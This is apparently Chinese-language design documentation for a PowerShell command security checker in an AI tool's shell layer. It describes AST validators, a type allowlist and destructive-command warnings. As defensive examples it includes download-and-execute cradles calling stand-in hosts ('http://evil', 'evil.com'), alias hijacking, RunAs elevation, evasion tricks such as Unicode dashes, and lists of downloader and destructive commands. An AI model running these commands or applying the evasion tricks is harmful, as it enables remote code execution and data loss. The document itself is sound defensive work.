# SecurityAnalysis — PowerShell 安全威胁检测层

## 概述与职责

SecurityAnalysis 是 PowerShellTool 的安全分析子系统，负责在 PowerShell 命令执行前进行静态安全检查。它位于 **ToolSystem → ShellTools → PowerShellTool** 层级中，与同级的 `powershellPermissions`（cmdlet 级权限匹配）和 `readOnlyValidation`（只读命令判定）协同工作，共同构成 PowerShell 命令的安全防线。

该模块由三个文件组成，各司其职：

| 文件 | 行数 | 职责 |
|------|------|------|
| `powershellSecurity.ts` | 1091 | 基于 AST 的危险模式检测引擎，23 个独立检查器 |
| `clmTypes.ts` | 212 | PowerShell 受约束语言模式（CLM）的 .NET 类型白名单 |
| `destructiveCommandWarning.ts` | 109 | 破坏性命令的人类可读警告文案生成 |

**核心设计理念**：所有安全检查基于 PowerShell AST（抽象语法树）分析，而非正则匹配原始文本。AST 解析失败时（`parsed.valid === false`），直接返回 `ask`（要求用户确认），实现 fail-closed 安全语义。

## 关键流程

### 主安全校验流程（`powershellCommandIsSafe`）

这是整个模块的唯一入口点（`powershellSecurity.ts:1042-1090`）。

1. 接收 `ParsedPowerShellCommand`（由外部 PowerShell 解析器生成的 AST 结构）
2. 若 `parsed.valid === false`（AST 解析失败），立即返回 `{ behavior: 'ask' }`
3. 依次执行 **23 个检查器**（validator），每个检查器返回三态结果：
   - `passthrough`：该检查器未发现问题，继续下一个
   - `ask`：检测到危险模式，要求用户确认（附带人类可读的 `message`）
   - `allow`：明确安全（当前实际未使用此值）
4. **短路语义**：一旦任何检查器返回 `ask`，立即终止后续检查并返回该结果
5. 全部通过则返回 `{ behavior: 'passthrough' }`

```typescript
// powershellSecurity.ts:1054-1079
const validators = [
  checkInvokeExpression,        // 代码注入
  checkDynamicCommandName,      // 动态命令名
  checkEncodedCommand,          // 编码命令混淆
  checkPwshCommandOrFile,       // 嵌套 PowerShell 进程
  checkDownloadCradles,         // 下载摇篮
  checkDownloadUtilities,       // 独立下载工具
  checkAddType,                 // 动态 .NET 编译
  checkComObject,               // COM 对象实例化
  checkDangerousFilePathExecution, // 脚本文件执行
  checkInvokeItem,              // 默认处理程序执行
  checkScheduledTask,           // 计划任务持久化
  checkForEachMemberName,       // 字符串方法调用
  checkStartProcess,            // 提权 & 嵌套进程
  checkScriptBlockInjection,    // 脚本块注入
  checkSubExpressions,          // 子表达式隐藏
  checkExpandableStrings,       // 可展开字符串
  checkSplatting,               // 参数展开
  checkStopParsing,             // 停止解析令牌
  checkMemberInvocations,       // .NET 方法调用
  checkTypeLiterals,            // CLM 类型白名单
  checkEnvVarManipulation,      // 环境变量篡改
  checkModuleLoading,           // 模块侧加载
  checkRuntimeStateManipulation,// 别名/变量劫持
  checkWmiProcessSpawn,         // WMI 进程创建
]
```

### CLM 类型白名单校验流程

当 `checkTypeLiterals` 遍历 AST 中的类型字面量时，每个类型名称会经过：

1. `normalizeTypeName()`（`clmTypes.ts:194-203`）：小写化 → 去除数组后缀 `[]` → 去除泛型参数 `[T]`
2. `isClmAllowedType()`（`clmTypes.ts:209-211`）：在 `CLM_ALLOWED_TYPES` Set 中查找
3. 不在白名单中的类型触发 `ask`，消息精确到类型名：`"Command uses .NET type [Reflection.Assembly] outside the ConstrainedLanguage allowlist"`

此外，`checkComObject` 中对 `New-Object` 的 `-TypeName` 参数也复用此白名单（`powershellSecurity.ts:421`），覆盖了类型名以字符串参数而非类型字面量出现的场景。

## 函数签名与参数说明

### `powershellCommandIsSafe(_command: string, parsed: ParsedPowerShellCommand): PowerShellSecurityResult`

主入口。`_command` 参数未使用（保留 API 兼容性），实际分析基于 `parsed` AST 结构。

> 源码位置：`powershellSecurity.ts:1042-1090`

### `isClmAllowedType(typeName: string): boolean`

判断类型名是否在 CLM 白名单中。内部调用 `normalizeTypeName` 处理数组/泛型语法。

> 源码位置：`clmTypes.ts:209-211`

### `normalizeTypeName(name: string): string`

规范化类型名：小写化、去除 `[]` 数组后缀、去除 `[T]` 泛型参数。

> 源码位置：`clmTypes.ts:194-203`

### `getDestructiveCommandWarning(command: string): string | null`

对原始命令文本进行正则匹配，返回第一个匹配的破坏性命令警告文案，或 `null`。**纯信息用途**，不影响权限逻辑。

> 源码位置：`destructiveCommandWarning.ts:102-109`

### `PowerShellSecurityResult` 类型

```typescript
type PowerShellSecurityResult = {
  behavior: 'passthrough' | 'ask' | 'allow'
  message?: string  // 人类可读的安全警告
}
```

> 源码位置：`powershellSecurity.ts:30-33`

## 23 个安全检查器详解

按检测类别分组：

### 代码注入类

| 检查器 | 检测目标 | 典型攻击 |
|--------|----------|----------|
| `checkInvokeExpression` | `Invoke-Expression` / `iex` | 等价于 `eval`，执行任意代码 |
| `checkDynamicCommandName` | 命令名非 `StringConstant` | `& ('i'+'ex') 'payload'` 绕过静态分析 |
| `checkEncodedCommand` | `pwsh -EncodedCommand` | Base64 编码混淆命令内容 |
| `checkScriptBlockInjection` | 危险 cmdlet 中的脚本块 | `Invoke-Command { malicious }` |
| `checkAddType` | `Add-Type` | 运行时编译加载 .NET 代码 |

**`checkDynamicCommandName`**（`powershellSecurity.ts:143-160`）的设计值得注意：它不是黑名单排除动态类型，而是**白名单只允许 `StringConstant`**。AST 中命令名元素若为 `Variable`、`IndexExpression`、`BinaryExpression` 等动态类型均会被拦截。这种 allowlist 设计避免了 `mapElementType` 将未知 AST 类型映射为 `'Other'` 时的遗漏。

### 下载执行类

| 检查器 | 检测目标 | 典型攻击 |
|--------|----------|----------|
| `checkDownloadCradles` | 下载+执行管道组合 | `IWR http://evil | IEX`（管道摇篮）或拆分变量摇篮 |
| `checkDownloadUtilities` | 独立下载工具 | `Start-BitsTransfer`（MITRE T1197）、`certutil -urlcache`、`bitsadmin /transfer` |

`checkDownloadCradles` 实现两层检测（`powershellSecurity.ts:234-264`）：
- **同语句**：单个管道中同时出现下载器（`IWR`/`IRM`/`New-Object`/`Start-BitsTransfer`）和 `IEX`
- **跨语句**：分号分隔的多语句中同时出现两者（`$r = IWR ...; IEX $r.Content`）

### 提权与进程创建类

| 检查器 | 检测目标 | 典型攻击 |
|--------|----------|----------|
| `checkStartProcess` | `Start-Process -Verb RunAs` 或启动 PS 可执行文件 | UAC 提权、嵌套不可验证进程 |
| `checkPwshCommandOrFile` | 命令位置出现 `pwsh`/`powershell` | 嵌套 PowerShell 进程逃逸安全检查 |
| `checkWmiProcessSpawn` | `Invoke-WmiMethod`/`Invoke-CimMethod` | `Invoke-WmiMethod -Class Win32_Process -Name Create` 绕过 `checkStartProcess` |

**`checkStartProcess`**（`powershellSecurity.ts:550-633`）处理两个攻击向量：
- **向量 1**：`-Verb RunAs` 提权。需处理空格语法、冒号绑定语法（`-Verb:RunAs`）、结构化 `children[]` 属性、以及反引号/引号/Unicode 破折号的规避手段
- **向量 2**：启动 PS 可执行文件。扫描所有参数查找 `pwsh`/`powershell` 路径名

### 参数前缀规避防御

`psExeHasParamAbbreviation`（`powershellSecurity.ts:83-100`）是全部参数匹配的包装函数。PowerShell 的 tokenizer 除标准连字符 `-` 外还接受四种替代字符作为参数前缀：

```typescript
// powershellSecurity.ts:67-72
const PS_ALT_PARAM_PREFIXES = new Set([
  '/',      // Windows PowerShell 5.1
  '\u2013', // en-dash
  '\u2014', // em-dash
  '\u2015', // horizontal bar
])
```

所有检查器通过此函数匹配参数，防止 `Start-Process foo –Verb RunAs`（使用 en-dash）绕过检测。

### COM 与 .NET 类型类

| 检查器 | 检测目标 |
|--------|----------|
| `checkComObject` | `New-Object -ComObject`（WScript.Shell、Shell.Application 等） |
| `checkTypeLiterals` | AST 类型字面量不在 CLM 白名单中 |
| `checkMemberInvocations` | `.NET` 方法调用（`.Method()` / `::StaticMethod`） |

`checkComObject`（`powershellSecurity.ts:343-429`）除检测 `-ComObject` 参数外，还提取 `New-Object` 的 `-TypeName` 参数值（支持命名参数、冒号绑定、位置参数三种形式），通过 CLM 白名单校验。这覆盖了 `New-Object System.Net.WebClient` 这类类型名以字符串而非类型字面量出现的场景。

### 持久化与状态篡改类

| 检查器 | 检测目标 |
|--------|----------|
| `checkScheduledTask` | `Register-ScheduledTask`、`schtasks /create` 等计划任务 |
| `checkEnvVarManipulation` | `env:` 作用域变量 + 写入 cmdlet 或赋值语句 |
| `checkModuleLoading` | `Import-Module`、`Install-Module`、`Save-Module` 等 |
| `checkRuntimeStateManipulation` | `Set-Alias`、`New-Alias`、`Set-Variable`、`New-Variable` |

`checkRuntimeStateManipulation`（`powershellSecurity.ts:982-1000`）阻止别名劫持攻击：例如 `Set-Alias Get-Content Invoke-Expression` 后，所有 `Get-Content $x` 调用都变成了任意代码执行。该检查器还会剥离模块限定符（`Microsoft.PowerShell.Utility\Set-Alias` → `set-alias`）。

### AST 结构检查类

这些检查器通过 `deriveSecurityFlags(parsed)` 获取 AST 布尔标志：

| 检查器 | 标志 | 风险 |
|--------|------|------|
| `checkSubExpressions` | `hasSubExpressions` | `$()` 可隐藏命令执行 |
| `checkExpandableStrings` | `hasExpandableStrings` | 双引号中嵌入 `$env:PATH` 或 `$(cmd)` |
| `checkSplatting` | `hasSplatting` | `@variable` 展开混淆参数 |
| `checkStopParsing` | `hasStopParsing` | `--%` 阻止后续解析 |

### 其他

| 检查器 | 检测目标 |
|--------|----------|
| `checkInvokeItem` | `Invoke-Item` / `ii` 通过默认处理程序执行文件 |
| `checkForEachMemberName` | `ForEach-Object -MemberName Kill` 按字符串名调用方法 |
| `checkDangerousFilePathExecution` | `Invoke-Command -FilePath`、`Start-Job -FilePath` 等执行脚本文件 |

## CLM 类型白名单（`clmTypes.ts`）

`CLM_ALLOWED_TYPES` 是一个 `ReadonlySet<string>`，包含约 90 个类型条目，来源于 [Microsoft 官方 CLM 文档](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes)。

白名单结构分三层：

1. **类型加速器短名**：`int`、`string`、`bool`、`hashtable`、`regex` 等
2. **`System.*` 全限定名**：`System.Int32`、`System.String`、`System.Collections.Hashtable` 等
3. **框架命名空间全限定名**：`Microsoft.Management.Infrastructure.CimInstance` 等

**安全删除项**（相对于 Microsoft 原始白名单）：

| 类型 | 删除原因 |
|------|----------|
| `adsi` / `adsisearcher` | 类型转换时执行 LDAP 网络绑定：`[adsi]'LDAP://evil.com/'` |
| `wmi` / `wmiclass` / `wmisearcher` | WMI 查询可远程执行：`[wmi]'\\evil-host\root\cimv2:Win32_Process'` |
| `cimsession` | 创建到远程主机的 CIM 会话 |

> 源码位置：`clmTypes.ts:18-188`（白名单定义）

## 破坏性命令警告（`destructiveCommandWarning.ts`）

**纯提示用途**——仅在权限对话框中展示警告文案，不参与权限判定或自动审批逻辑。

`DESTRUCTIVE_PATTERNS` 数组定义了 14 个正则模式，覆盖四类破坏性操作：

### 文件删除
- `Remove-Item`（及别名 `rm`/`del`/`rd`/`rmdir`/`ri`）+ `-Recurse` 和/或 `-Force`
- `Clear-Content` + 通配符路径
- `Format-Volume`、`Clear-Disk`

### Git 危险操作
- `git reset --hard`、`git push --force`、`git clean -f`（排除 `--dry-run`）、`git stash drop/clear`

### 数据库操作
- `DROP TABLE`/`DATABASE`/`SCHEMA`、`TRUNCATE TABLE`

### 系统操作
- `Stop-Computer`、`Restart-Computer`、`Clear-RecycleBin`

正则设计细节（`destructiveCommandWarning.ts:14-20`）：模式使用 `(?:^|[|;&\n({])` 锚定语句开头，避免 `git rm --force` 误匹配 `rm`。终止符使用 `[^|;&\n}]` 而**不包含 `)`**——因为 `)` 可能只是路径分组的闭合：`Remove-Item (Join-Path $r "tmp") -Recurse -Force` 仍需告警。

## 边界 Case 与注意事项

1. **AST 解析失败 = ask**：`powershellCommandIsSafe` 在 `parsed.valid === false` 时直接返回 `ask`，实现 fail-closed。所有单独检查器都依赖 AST 结构，不会对无效 AST 产生 `passthrough`。

2. **检查器顺序有语义**：`checkDownloadCradles` 排在 `checkInvokeExpression` 之后——跨语句摇篮已被 IEX 检查覆盖，但 download cradle 检查提供了更精确的警告消息。`checkTypeLiterals` 排在 `checkMemberInvocations` 之后——方法调用检查是宽泛拦截，类型白名单是精确诊断。

3. **参数缩写匹配**：PowerShell 允许参数缩写（`-e` 匹配 `-EncodedCommand`）。`psExeHasParamAbbreviation` 同时处理标准连字符和四种 Unicode 替代破折号，防止 bypass。

4. **`destructiveCommandWarning` 与安全检查完全解耦**：前者基于正则匹配原始文本，用于 UI 提示；后者基于 AST 分析，用于权限决策。两者独立运行，互不影响。

5. **CLM 白名单的 "反转" 使用**：Microsoft CLM 白名单原意是"这些类型可以在受约束模式下使用"。本模块反转逻辑——白名单外的类型触发 `ask`，避免逐一枚举危险类型（命名管道、反射、进程创建、P/Invoke 编组等），一次性覆盖所有未知威胁。

6. **`New-Object` 的双重检查**：`checkComObject` 同时检查 `-ComObject` 参数和 `-TypeName` 参数的 CLM 合规性。这是因为 `New-Object System.Net.WebClient` 的类型名以字符串参数传递，不会出现在 `parsed.typeLiterals` 中，`checkTypeLiterals` 无法覆盖。